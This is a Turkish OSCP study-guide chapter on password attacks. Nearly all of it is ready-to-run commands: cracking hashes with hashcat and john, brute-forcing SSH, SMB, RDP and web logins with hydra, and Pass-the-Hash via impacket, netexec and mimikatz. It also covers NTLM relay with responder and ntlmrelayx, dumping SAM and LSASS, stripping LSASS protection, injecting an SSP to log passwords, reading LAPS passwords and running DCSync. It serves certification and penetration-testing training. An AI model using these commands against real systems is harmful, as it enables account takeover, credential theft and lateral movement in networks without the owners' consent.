---
layout: page
title: "Bölüm 3 — Parola Saldırıları & Hash Kırma"
oscp: true
toc: true
permalink: /oscp/03-parola-saldirilari/
---

{% raw %}
Bu bölüm, elde hash/kullanıcı adı varken yapılan her şeyi kapsar: hash tespiti,
offline kırma (hashcat/john), online brute-force (hydra), Pass-the-Hash, NTLM relay
temelleri ve hedef üzerinde credential avcılığı. Akış her zaman aynıdır:
**önce hedefte credential ara → hash çıkardıysan önce yeniden kullanmayı dene
(PtH) → kırmaya değerse offline kır.** Kırma işlemi sınavda/sahada en çok zaman
yiyen adımdır; doğru mod + doğru liste seçimi bu bölümün tamamıdır.

İlgili bölümler: [Bölüm 4 — Windows Privesc](/oscp/04-windows-privesc/),
[Bölüm 6 — AD Enumerasyon](/oscp/06-ad-enumerasyon/),
[Bölüm 7 — AD Kimlik Doğrulama Saldırıları](/oscp/07-ad-saldirilari/).

## 3.1 Hash Tespiti ve Hash Türleri

### hashid / hash-identifier ile mod bulma
**Ne:** Eldeki hash'in hangi algoritma olduğunu tahmin eder; hashcat `-m` / john
`--format` parametresi için başlangıç noktasıdır.

```bash
hashid '<HASH>'
hashid -m '<HASH>'        # doğrudan hashcat mod numarası önerir
# Alternatif:
python3 hash-identifier.py
```

**Tuzaklar / notlar:**
- `hashid` yalnızca *olası* modları sıralar; tek aday değildir. Şüphede en yaygın
  moddan başla, tutmazsa sıradakini dene.
- Hash başındaki `$` imzaları çoğu zaman modu kendisi söyler — hashid'e gerek
  kalmadan tablodan oku (aşağıya bak).

### Yaygın hash formatları (ezberlenecek tablo)

```text
Linux /etc/shadow ($id$salt$hash):
  $1$    MD5crypt          hashcat -m 500
  $2a$   Blowfish          hashcat -m 3200
  $5$    SHA-256crypt      hashcat -m 7400
  $6$    SHA-512crypt      hashcat -m 1800   (modern varsayılan)
  $y$    Yescrypt          hashcat -m 7400 serisi / john derlemesi
  $7$    Scrypt

Windows:
  LM:NTLM  aad3b435b51404ee...:31d6cfe0...   (LM yoksa boş LM aad3... görülür)
  NT hash  (MD4)              hashcat -m 1000   john --format=NT
  NTLMv1/v2 ağ hash'i (challenge-response)    hashcat -m 5500 / 5600

Diğer sık çıkanlar:
  Kerberos AS-REP (krb5asrep) hashcat -m 18200
  Kerberoast TGS (krb5tgs)    hashcat -m 13100
  KeePass KDBX                hashcat -m 13400 (keepass2john ile önce çevir)
  SSH private key             ssh2john ile çevir, sonra john
  WPA/WPA2 handshake          hashcat -m 22000 (hashcat formatında)
  MS Office dokümanı          office2john ile çevir
  ZIP / PDF / RAR             zip2john / pdf2john / rar2john
```

**Tuzaklar / notlar:**
- Windows SAM çıktısındaki `aad3b435b51404eeaad3b435b51404ee` sabit değer boş LM
  hashidir; kırılacak kısım ikinci yarı (NT hash)'tir. Boş NT hash
  `31d6cfe0d16ae931b73c59d7e0c089c0` = boş parola.
- `meterpreter` hashdump / secretsdump çıktısı `user:rid:lm:nt:::` formatındadır;
  kırmak için yalnızca NT kısmını (`:` ile `:::` arası) dosyaya koy.
- NTLMv2 ağ hash'ini (`kullanıcı::domain:challenge:response:blob`) SAM hash'iyle
  karıştırma — ağ hash'i yalnızca o challenge'a özeldir, PtH'de kullanılmaz.

## 3.2 Hashcat

### Temel kullanım ve saldırı modları (-a)
**Ne:** GPU tabanlı, en hızlı offline kırıcı. `-m` = hash modu, `-a` = saldırı tipi.

```bash
# Dictionary attack (kelime listesi, en sık kullanılan)
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt

# Kırılanları göster (pot dosyasından)
hashcat -m 1000 ntlm_hashes.txt --show

# Brute-force / maske (uzunluk 1-8, küçük harf + rakam)
hashcat -m 1000 -a 3 ntlm_hashes.txt '?l?l?l?l?l?l?d?d'

# Hybrid: kelimenin sonuna 2 rakam ekle
hashcat -m 1000 -a 6 ntlm_hashes.txt rockyou.txt '?d?d'

# Combinator: iki listeyi birleştir (kural ile aynı sonuç, daha hızlı)
hashcat -m 1000 -a 1 ntlm_hashes.txt adlar.txt sonlar.txt
```

```text
-a 0  dictionary         tek liste
-a 1  combinator         liste1 + liste2 birleşimi
-a 3  brute-force        maske (?l küçük, ?u büyük, ?d rakam, ?s özel, ?a hepsi)
-a 6  hybrid wordlist+mask    kelime + sabit ekleme
-a 7  hybrid mask+wordlist    sabit önek + kelime
```

**Tuzaklar / notlar:**
- VM'de GPU yoksa hashcat reddeder; `-I` ile cihaz listele, gerekirse CPU için
  `--force` (çok yavaştır — john kullanmak daha akıllıca olabilir).
- Kırılan parolalar `~/.local/share/hashcat/hashcat.potfile` içine yazılır;
  potfile'ı sıfırlamazsan aynı hash "zaten kırılmış" görünür.

### Rule (kural) ile mutasyon
**Ne:** Kelime listesindeki her kelimeyi kural dosyasındaki fonksiyonlarla
dönüştürerek denemek. `l/u/c` büyük-küçük, `$X` sona ekle, `^X` başa ekle,
`sXY` X→Y değiştir. Kurallar soldan sağa okunur.

```bash
# Özel kural yazımı: büyük harfle başlat, o->0, sona ! ekle
cat > demo.rule <<'EOF'
:
c
so0
c so0
c so0 $!
EOF

# Kuralın ne ürettiğini önce dry-run gör (çok önemli!)
hashcat -r demo.rule --stdout demo.txt

# Kullanım: -r kural dosyası kelime listesinden sonra
hashcat -m 13400 keepass.hash rockyou.txt \
  -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# Hazır kurallar:
ls /usr/share/hashcat/rules/
#   best64.rule        → hızlı ve etkili, ilk denenecek
#   rockyou-30000.rule → daha derin
#   dive.rule          → en geniş (çok zaman alır)
```

**Tuzaklar / notlar:**
- Elde hedefe özel kelime listesi + kural varsa önce bulunan parolaların
  **kombinasyon ve rakam/özel-karakter varyantlarına** bak (örn. `Yaz2024`,
  `Yaz2024!`); kullanıcılar kalıp değiştirmez, sondaki sayıyı değiştirir.
- `hashcat --stdout -r kural listesi > mut.list` ile mutasyona uğramış listeyi
  önce üretip sonra hydra'ya vermek, her bağlantıda mutasyonu yeniden hesaplamaktan
  çok daha hızlıdır.

## 3.3 John the Ripper

### Modlar ve karşılaştırma
**Ne:** CPU tabanlı kırıcı; hashcat'in aksine GPU gerektirmez, "her şeyi biraz
kırar". GPU varsa hashcat her zaman daha hızlıdır; hashcat'in desteklemediği veya
VM ortamında patladığı formatlarda john'a geç.

```bash
john --list=formats | grep NT        # desteklenen formatları listele

# Wordlist modu (en yaygın)
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Kural ile
john --wordlist=rockyou.txt --rules hashes.txt

# Single crack (kullanıcı adından tahmin üretir — hızlı ilk tur)
john --single hashes.txt

# Incremental (brute-force; çok yavaş, son çare)
john --incremental hashes.txt

# İlerleme / kırılanları göster
john --show hashes.txt
```

**hashcat vs john — ne zaman hangisi:**

```text
Durum                              Tercih
GPU mevcut, bilinen mod            hashcat (10-100x hızlı)
VM / GPU yok                       john
2john ile çevrilen dosya formatı   john (zip/pdf/ssh/keepass...)
Single-crack / ad-bazlı tahmin     john --single
NetNTLMv1/v2, WPA handshake        hashcat (-m 5500/5600/22000)
```

**Tuzaklar / notlar:**
- Kırılan parolalar `~/.john/john.pot`'a yazılır; `john --show hashes.txt` ile
  tekrar gösterilir. Yeni hash eklersen eski potfile sayesinde anında eşleşir.
- `--format` yanlış verilirse john ya hata verir ya da boşuna çalışır; önce
  `john hashes.txt` ile formatı otomatik tahmin ettirmek güvenlidir.

### 2john ailesi: şifreli dosyaları hash'e çevirme
**Ne:** Korumalı dosyalar doğrudan kırılamaz; önce ilgili `*2john` aracıyla hash
formatına çevrilir, sonra john/hashcat'e verilir.

```bash
ssh2john id_rsa > id_rsa.hash && john --wordlist=rockyou.txt id_rsa.hash
keepass2john database.kdbx > keepass.hash
zip2john archive.zip > archive.hash
pdf2john server_doc.pdf > server_doc.hash
office2john report.docx > report.hash
rar2john backup.rar > backup.hash
pfx2john cert.pfx > cert.hash
putty2john private.ppk > ppk.hash
```

**Tuzaklar / notlar:**
- SSH anahtarı passphrase'li ise `ssh2john` + rockyou ilk adımdır; anahtar
  passphrase'sizse hiç kırmaya gerek yoktur (`ssh -i id_rsa` dene).
- KeePass için `hashcat -m 13400` kullanılacaksa çevrilen hash başındaki dosya
  adı kısmını temizlemek gerekebilir.

## 3.4 Kelime Listeleri ve Hedefe Özel Liste Üretme

### Kaynak listeler
```bash
/usr/share/wordlists/rockyou.txt          # evrensel ilk tur
/usr/share/seclists/Passwords/            # parola alt klasörleri
/usr/share/seclists/Usernames/            # kullanıcı adı listeleri
/usr/share/seclists/Passwords/Default-Credentials/   # varsayılan creds
```

### CeWL ile hedef site kelimesi çıkarma
**Ne:** Şirket sitesini tarayıp özel kelime listesi üretir; kuralla birleştirince
"Yaz2024!" tarzı kurumsal parolaları yakalama olasılığı katlanır.

```bash
# Site kelimeleri: depth 4, min 6 harf, küçük harf, dosyaya yaz
cewl https://TARGET/ -d 4 -m 6 --lowercase -w target.wordlist

# Sadece e-posta adreslerini çıkar
cewl https://TARGET/ -e -n -w maillist.txt

# Sayı içeren alfa-nümerik kelimeler
cewl https://TARGET/page --with-numbers
```

**Tuzaklar / notlar:**
- CeWL listesi tek başına zayıftır; mutlaka `best64.rule` veya rakam ekleme
  (`-a 6 ... ?d?d`) ile mutasyona sok.
- Kullanıcı adı kalıbını (örn. `adi.soyadi`) bulmak parola kırmadan daha değerlidir;
  `username-anarchy` ile isim listesini kalıplara çevir:

```bash
./username-anarchy -i names.txt > usernames.txt
```

## 3.5 Hydra ile Servis Bazlı Brute-Force (Online)

**Ne:** Kullanıcı adı + parola listesini doğrudan servise karşı dener. Online
olduğu için yavaştır ve kilitlenme (lockout) riski taşır — önce lockout politikasını
kontrol et, listeyi küçük tut, sık denemelerde dur.

### SSH
```bash
hydra -L users.txt -P passwords.txt ssh://TARGET -t 4 -f
hydra -l <KULLANICI> -P passwords.txt ssh://TARGET -t 4 -f
```

### SMB
```bash
hydra -L users.txt -P passwords.txt smb://TARGET -f
# SMB'de hızlı spray için netexec daha bilgilendirici çıktı verir:
netexec smb TARGET -u users.txt -p passwords.txt
netexec smb TARGET -u <KULLANICI> -p '<PAROLA>' --shares
```

### HTTP form (login sayfası)
```bash
# POST form: -m modül, kullanıcı/parola alan adları, başarısızlık dizesi
hydra -l admin -P passwords.txt TARGET \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid" -f

# Basic auth
hydra -l <KULLANICI> -P passwords.txt TARGET http-get / -f
```

### RDP / diğer servisler
```bash
hydra -L users.txt -P passwords.txt rdp://TARGET -f
hydra -l <KULLANICI> -P passwords.txt ftp://TARGET
hydra -l <KULLANICI> -P passwords.txt mysql://TARGET
hydra -l <KULLANICI> -P passwords.txt vnc://TARGET
```

### user:password çift listesi ile
```bash
# 'kullanici:parola' formatında hazır varsayılan-cred listeleri için
hydra -C default_creds.txt TARGET ssh://
```

**Tuzaklar / notlar:**
- `-f` ilk isabette durur; yoksa listedeki her kombinasyonu dener.
- `-t` (thread) değerini düşük tut; yüksek thread SSH/RDP'de bağlantı reddi üretir.
- HTTP formda **yanlışlık dizesi** (`F=...` / son parametre) yanlışsa her deneme
  "başarılı" görünür — önce bilerek yanlış parolayla test et.
- WinRM (5985/5986) için hydra yerine doğrudan spray + shell:

```bash
netexec winrm TARGET -u users.txt -p passwords.txt
evil-winrm -i TARGET -u <KULLANICI> -p '<PAROLA>'
```

## 3.6 Pass-the-Hash (PtH)

**Ne:** NTLM salt'sizdir; NT hash'i bilen kişi parolayı bilmeden kimlik doğrulatabilir.
Hash çıktıysa önce PtH dene — parolayı kırmaya çalışmak çoğu zaman gereksizdir.
Boş LM için: `-hashes 00000000000000000000000000000000:<NT_HASH>`.

### impacket ile komut çalıştırma / shell
```bash
impacket-psexec  -hashes 00000000000000000000000000000000:<HASH> <KULLANICI>@TARGET
impacket-smbexec -hashes 00000000000000000000000000000000:<HASH> <KULLANICI>@TARGET
impacket-wmiexec -hashes 00000000000000000000000000000000:<HASH> <KULLANICI>@TARGET
# Domain hesabı:
impacket-psexec <DOMAIN>.lab/<KULLANICI>@TARGET -hashes :<HASH>
```

**Ne zaman hangisi:** psexec servis bırakır (gürültülü); smbexec fileless'tır;
wmiexec WMI üzerinden, 135/tcp ister, çoğu zaman en sessizidir.

### smbclient ile dosya erişimi
```bash
smbclient \\\\TARGET\\<SHARE> -U <KULLANICI> --pw-nt-hash <HASH>
```

### netexec / crackmapexec ile yatay tarama
**Ne:** Bir hash'in ağdaki hangi makinelerde geçerli olduğunu topluca test eder;
`Pwn3d!` çıktısı local admin olduğunu gösterir.

```bash
netexec smb 10.10.10.0/24 -u <KULLANICI> -H <HASH>
netexec smb TARGET -u <KULLANICI> -H <HASH> -x whoami
# Local hash'i başka makinelerde local admin olarak dene (parola yeniden kullanımı avı):
netexec smb 10.10.10.0/24 -u <KULLANICI> -H <HASH> --local-auth
```

### evil-winrm / xfreerdp ile PtH
```bash
evil-winrm -i TARGET -u <KULLANICI> -H <HASH>
xfreerdp /v:TARGET /u:<KULLANICI> /pth:<HASH>
```

**Tuzaklar / notlar:**
- RDP PtH yalnızca Restricted Admin Mode açıksa çalışır (hedefte
  `HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0` gerekir).
- UAC local hesapların uzaktan yönetimini kısıtlar: `LocalAccountTokenFilterPolicy=0`
  ise yalnızca built-in Administrator (RID 500) PtH ile uzaktan admin olur. Domain
  hesabında bu kısıt yoktur.
- `FilterAdministratorToken=1` ise RID 500 bile UAC korumalıdır — PtH başarısız olur.

### Windows üzerinde PtH — mimikatz / Invoke-TheHash
```bash
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:<KULLANICI> /rc4:<HASH> /domain:<DOMAIN>.lab /run:cmd.exe
# Local hesap için /domain yerine makine adı, localhost veya .

# PowerShell ile (PsExec/WMI eşdeğeri, hash LM:NTLM veya yalnız NT olabilir):
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target TARGET -Domain <DOMAIN>.lab -Username <KULLANICI> \
  -Hash <HASH> -Command "net user <KULLANICI>2 <PAROLA> /add" -Verbose
Invoke-WMIExec -Target TARGET -Username <KULLANICI> -Hash <HASH> -Command "whoami"
```

Detaylı yatay hareket ve ticket tabanlı saldırılar için
[Bölüm 7](/oscp/07-ad-saldirilari/)'ye bak.

## 3.7 NTLM Relay Temelleri

**Ne:** SMB imzalamayan bir hedefin kimlik doğrulama isteğini (NetNTLM challenge-
response) yakalayıp başka bir sunucuya aktarmak. Yaygın tetikleyiciler: LLMNR/NBNS
poisoning, dosya paylaşımı tuzağı, web uygulamasında hedefin IP'sini gösterme
(örn. upload formunda/samba symlinkte kendi IP'ni verince hedef sana NetNTLM
hash'i bırakır).

```bash
# Hedefin kimliğini relay'leyip komut çalıştır:
impacket-ntlmrelayx --no-http-server -smb2support -t TARGET \
  -c "powershell -enc <BASE64_KOMUT>"

# Keşif modu: relay edilebilir hedefleri ve hakları haritala
impacket-ntlmrelayx -tf targets.txt -smb2support

# Hash yakalama tarafı (aynı anda LLMNR/NBTSNS zehirleme yapar):
responder -I eth0 -w -f
```

**Tuzaklar / notlar:**
- `-t` relay sonrası komut çalıştırılacak makinedir; trafik kaynağı değil.
- Hedef SMB imzalama (signing) zorunlu tutuyorsa relay çalışmaz; netexec ile ölç:
  `netexec smb 10.10.10.0/24 --gen-relay-list relay.txt` imzasız makineleri listeler.
- HTTP'den SMB'ye relay için `-smb2support` modern sistemlerde şarttır.
- Yakalanan NetNTLMv2 hash'i (challenge-response) aynı zamanda kırılabilir:
  `hashcat -m 5600 netntlmv2.hash rockyou.txt`.
- Tam relay zincirleri, IPv6 tabanlı tetikleyiciler ve AV kısıtları için
  [Bölüm 7](/oscp/07-ad-saldirilari/).

## 3.8 Credential Avcılığı (Credential Harvesting)

### Dosya ve geçmiş tabanlı avcılık — Linux
**Ne:** İlk erişim sonrası sistemde parola/benzeri içeren dosyaları, history'leri,
anahtarları ve bellekte önbelleklenmiş secret'ları tarar. Kelimeler: `password`,
`passwd`, `pwd`, `credential`, `secret`, `key`, `token`, `apikey`.

```bash
# Konfigürasyon dosyalarında kullanıcı/parola ara
for i in $(find / -name "*.cnf" -o -name "*.conf" -o -name "*.config" 2>/dev/null \
  | grep -v "doc\|lib\|share"); do
  echo -e "\nFile: $i"; grep -i "user\|pass" "$i" 2>/dev/null | grep -v "^#"
done

# SSH özel anahtarları ara
grep -rnw "PRIVATE KEY" /home/* /root 2>/dev/null | grep ":1"

# Bash history + profil dosyaları
tail -n 20 /home/*/.bash_history 2>/dev/null
cat /home/*/.bashrc /home/*/.bash_profile 2>/dev/null | grep -i pass

# Loglarda kimlik bilgisi izleri
grep -riE "pass(wor)?d|token|secret" /var/log/auth.log /var/log/syslog 2>/dev/null

# /etc/passwd'de x yerine hash / boş alan varsa şüphelen
awk -F: '($2 != "x") {print $1, $2}' /etc/passwd

# Önceki parolalar (PAM parola geçmişi)
sudo cat /etc/security/opasswd

# Bellekte önbelleklenmiş parolalar + tarayıcı parolaları + genel tarama
sudo python3 mimipenguin.py
sudo python3 laZagne.py all
firefox_decrypt.py     # ~/.mozilla/firefox/*/logins.json çözer
```

```bash
# /etc/shadow hash'lerini john formatında birleştirip kır
sudo unshadow /etc/passwd /etc/shadow > unshadowed.hashes
hashcat -m 1800 -a 0 unshadowed.hashes rockyou.txt     # SHA-512crypt
hashcat -m 500  -a 0 unshadowed.hashes rockyou.txt     # MD5crypt
```

**Tuzaklar / notlar:**
- `/etc/passwd` yazılabilirse root'un parola alanını boşaltıp parolasız girebilirsin
  (`root::0:0:...`) — privesc tekniği, ayrıca bkz. [Bölüm 5](/oscp/05-linux-privesc/).
- `opasswd`'deki eski parolalar **kalıp** verir: kullanıcı genelde aynı kökü ve
  farklı yıl/sayı kullanır; kural üretiminde bunu besle.

### Dosya tabanlı avcılık — Windows
```cmd
:: Tüm sabit diskte parola içeren dosyaları tara (cmd)
findstr /SIM /C:"password" C:\*.txt C:\*.ini C:\*.cfg C:\*.config C:\*.xml C:\*.ps1 2>nul

:: Dosya adıyla arama (find eşdeğeri)
dir /s /b *unattend*  *password*  *.kdbx

:: Registry'de düz parola ara
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

:: Kayıtlı RDP/son kullanılan hesaplar
cmdkey /list

:: PowerShell komut geçmişi (parola geçmişme ihtimali yüksek)
type C:\Users\<KULLANICI>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```powershell
# AD'de açıklama alanına yazılmış parolalar
Get-ADUser -Filter * -Properties SamAccountName,Description |
  Select-Object SamAccountName,Description

# Unattend.xml kalıntıları (base64'e çevrilmiş parolalar olabilir)
Get-ChildItem C:\Windows\Panther\ -Filter *.xml | Select-String -Pattern "Password"
```

**Klasik parola barındıran yerler kontrol listesi:**
```text
C:\Windows\Panther\Unattend.xml / Autounattend.xml   (base64 parolalar)
SYSVOL'daki GPP scriptleri ve XML'leri                 (cpassword!)
web.config (IIS / dev makineleri / paylaşımlar)
AD kullanıcı/bilgisayar Description alanları
pass.txt, passwords.docx/.xlsx (kullanıcı dizinleri, paylaşımlar)
KeePass .kdbx → keepass2john ile hash çıkar, kır, içindeki her şeyi al
Son araçlar: lazagne.exe all -vv  (hepsini tek seferde tarar)
```

### SAM veritabanı — registry hive save
**Ne:** Yerel hesap hash'leri SAM'da, SAM syskey ile şifrelidir; çözmek için
`hklm\sam` + `hklm\system` (bootkey) gerekir. `hklm\security` domain-joined
makinede cache'lenmiş domain cred'leri içerir. Admin yetkisi ister.

```cmd
:: Hedefte (yönetici cmd):
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

```bash
# Dosyaları attack host'a al (smbserver ile):
sudo impacket-smbserver -smb2support CompData /home/kali/evidence/

# Attack host'ta hash'leri çöz:
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

**Tuzaklar / notlar:**
- SAM dosyası çalışan sistemde kilitlidir; registry `save` veya VSS yoluyla alınır.
- secretsdump çıktısı `user:rid:lm:nt:::`; kırmak için NT kısmını al.
- Alternatif: `netexec smb TARGET -u <KULLANICI> -p '<PAROLA>' --sam` / `--lsa`
  ile uzaktan çek (veya aynı yetkiyle `impacket-secretsdump <DOMAIN>.lab/<KULLANICI>:'<PAROLA>'@TARGET`).

### SAM — Volume Shadow Copy ile alma
```cmd
wmic shadowcopy call create Volume='C:\'
vssadmin list shadows
:: Çıktıdaki shadow path'i kullan (örn HarddiskVolumeShadowCopy1):
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\<KULLANICI>\Desktop\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\<KULLANICI>\Desktop\system
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\security C:\users\<KULLANICI>\Desktop\security
```

```bash
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### LSASS belleği — dump çıkarma ve çözümleme
**Ne:** LSASS oturum açmış kullanıcıların hash/parola/ticket'larını bellekte tutar.
Dump'i alıp **kendi makinende** çözmek hem AV'den kaçar hem de kanıt hijyeni
sağlar. Admin yetkisi gerekir.

```cmd
:: Yöntem 1: rundll32 + comsvcs.dll (PID bul):
tasklist /svc | findstr lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full

:: Yöntem 2: Task Manager > Details > lsass.exe > Create dump file
::   (dump %TEMP%\lsass.DMP altına düşer)
:: Yöntem 3: Sysinternals ProcDump:
procdump.exe -accepteula -ma lsass.exe C:\lsass_dump
```

```bash
# Attack host'ta çözümle (mimikatz kendi makinende çalışır):
pypykatz lsa minidump lsass.dmp
```

pypykatz çıktısındaki paketler: **MSV** (NT/SHA1 hash), **WDIGEST** (eski
sistemlerde düz parola — günümüzde kapalı), **Kerberos** (ticket/ekeys),
**DPAPI** (Chrome/IE/Outlook/RDP kayıtlı parolaların ana anahtarı).

**Protected LSASS (RunAsPPL) varsa hedefte:**

```text
mimikatz # !+                              # mimidrv.sys kernel sürücüsünü yükle
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # privilege::debug
mimikatz # token::elevate                  # sekurlsa için gerekli
mimikatz # sekurlsa::logonpasswords
```

- `sekurlsa::logonpasswords` 0x00000005 (Access Denied) verirse LSA protection
  açıktır; dump dosyasını yukarıdaki yöntemlerle alıp pypykatz ile çöz.
- Credential Guard açıksa LSASS'tan hash gelmez → `misc::memssp` ile SSP enjekte
  et, host'a login olan sonraki kullanıcıların parolaları
  `C:\Windows\System32\mimilsa.log` içine düşer (seni beklemek gerekir).
- Kontrol: `Get-ComputerInfo` → `DeviceGuardSecurityServicesConfigured`.

### mimikatz hızlı referansı
```text
mimikatz # privilege::debug          # SeDebugPrivilege aç (sekurlsa/lsadump öncesi)
mimikatz # token::elevate            # token'ı SYSTEM'e yükselt
mimikatz # sekurlsa::logonpasswords  # bellekteki hash + düz parolalar
mimikatz # sekurlsa::credman         # yalnız Credential Manager kayıtları
mimikatz # sekurlsa::ekeys           # Kerberos anahtarları (Pass-the-Key)
mimikatz # lsadump::sam              # SAM hash'leri (syskey dahil)
mimikatz # lsadump::secrets          # LSA secrets (bazen düz parola)
mimikatz # lsadump::dcsync /user:<DOMAIN>.lab\krbtgt   # DCSync (bkz. Bölüm 7)
```

Meterpreter eşdeğerleri: `load kiwi` → `creds_all`, `lsa_dump_sam`,
`lsa_dump_secrets`.

### Credential Manager / vaultcmd / runas
```cmd
:: Kayıtlı vault'ları ve kayıtları listele
vaultcmd /list
VaultCmd /listproperties:"Web Credentials"
VaultCmd /listcreds:"Web Credentials"        # parolayı göstermez

:: Kayıtlı kimlikler + /savecred ile parolayı sormadan çalıştır
cmdkey /list
runas /savecred /user:<DOMAIN>.lab\<KULLANICI> cmd.exe
```

```powershell
# Web Credentials parolalarını düz göster
Import-Module .\Get-WebCredentials.ps1
Get-WebCredentials

# Kayıtlı kimlikleri lazagne ile topla
.\laZagne.exe all -vv
```

**Tuzaklar / notlar:**
- `runas /savecred` parolayı diskte DPAPI ile saklar; hedefte admin isen
  mimikatz `sekurlsa::credman` ile çözersin.
- `cmdkey /list` çıktısı "bu makinede daha önce kimlerle bağlanıldı" haritası
  verir — PtH hedef listesi için altın değerindedir.

### LAPS
**Ne:** LAPS etkin makinelerin local admin parolası AD bilgisayar nesnesinin
`ms-Mcs-AdmPwd` özniteliğinde düz metin tutulur. Okuma yetkisi "All extended rights"
atanmış gruplara verilmiştir.

```powershell
# LAPS kurulu mu / hangi cmdlet'ler var
dir "C:\Program Files\LAPS\CSE"
Get-Command *AdmPwd*

# Hangi OU'da kimlerin okuma hakkı var
Find-AdmPwdExtendedRights -Identity <OU_ADI>
net groups "<OKUMA_HAKKI_OLAN_GRUP>"

# Doğru yetkili kullanıcıyla parolayı oku (SAMAccountName kullan!)
Get-AdmPwdPassword -ComputerName <MAKINE_SAM_ADI>

# LAPSToolkit (bulk):
Get-LAPSComputers          # erişilebilenlerin parolasını da gösterir
Find-LAPSDelegatedGroups
```

**Tuzaklar / notlar:**
- `-ComputerName` DNS adı değil **SAMAccountName** olmalı; farklı olabilir.
- Eski LAPS'ta SYSVOL'da şifreli parola kalmış olabilir; yeni LAPS'ta öznitelik
  ACL'iyle korunur — yetki atamalarını (extended rights) Bölüm 6/7'deki AD
  yetki analiziyle bul.

### Domain Controller: NTDS.dit ve DCSync (özet)
**Ne:** DC'ye admin erişimin varsa tüm domain hash'lerini alırsın. Detay
[Bölüm 7](/oscp/07-ad-saldirilari/)'de; kırma tarafı burada.

```bash
# DCSync (yetkili domain hesabıyla uzaktan, NTDS dosyasına dokunmadan):
impacket-secretsdump -just-dc <DOMAIN>.lab/<KULLANICI>@TARGET
impacket-secretsdump -just-dc-ntlm <DOMAIN>.lab/<KULLANICI>@TARGET

# DC'de local erişimle: VSS snapshot + ntdsutil ile paketle, sonra:
impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit local

# Tek komutla (smb üzerinden):
netexec smb TARGET -u <KULLANICI> -p '<PAROLA>' --ntds
```

## 3.9 Parola Yeniden Kullanımı Kalıpları

**Ne:** Kırılan/ele geçen bir parolanın aynısını ve varyantlarını her yerde
denemek çoğu senaryoda en hızlı ilerleme yoludur. Lab dahil gerçek ağların
nöralgik noktası budur.

```text
Kontrol sırası (hash/parola ele geçtiğinde):
1. Aynı parolayı aynı kullanıcı için diğer servislerde dene
   (SSH→SMB→WinRM→RDP→web login).
2. Aynı parolayı diğer hesaplarda dene (admins, servis hesapları).
3. Local admin hash'i tüm subnet'te --local-auth ile PtH tara.
4. Domain hesabıysa DC'ye DCSync yetkisi var mı kontrol et.
5. Parola kalıbını al (kök + yıl/sayı/özel karakter); kuralla varyant üret:
   "Yaz2023!" → "Yaz2024!", "Kis2024!", "Yaz2024" ...
6. KeePass/RDP kayıtları/cmdkey geçmişi → diğer sistemlere ipucu.
```

```bash
# Subnet geneli local admin hash taraması (yeniden kullanım avı)
netexec smb 10.10.10.0/24 -u <KULLANICI> -H <HASH> --local-auth

# Aynı parolayı çoklu servise dene (hydra -C çift listesi)
hydra -C creds.txt ssh://TARGET
netexec smb 10.10.10.0/24 -u users.txt -p '<PAROLA>'
```

**Kalıp notları / tuzaklar:**
- Kullanıcılar parolayı değiştirdiğinde genelde **sondaki sayıyı/yılı** değiştirir;
  kırılan bir parolanın varyantları, kalan hesapları açma olasılığı yüksektir.
- Local admin parolası yeniden kullanımı (aynı parola/hash birden çok makinede)
  tek bir SAM dump'iyle tüm subnet'i ele geçirmek demektir — bu yüzden
  `--local-auth` taraması standart adımdır.
- Servis hesapları (svc-*, sql, backup) parola değiştirmez; uzun yıllar geçerlidir
  ve genelde geniş yetkilidir — öncelikli hedeftir.
- Kırılan hash'i raporla ama sınav/lab cevabı olarak değil kanıt olarak sakla;
  düz parola ve hash'in eşleştiği çıktıyı (john --show) kaydet.

---

[← Bölüm 2](/oscp/02-web-saldirilari/) · [Bölüm 4 →](/oscp/04-windows-privesc/)
{% endraw %}
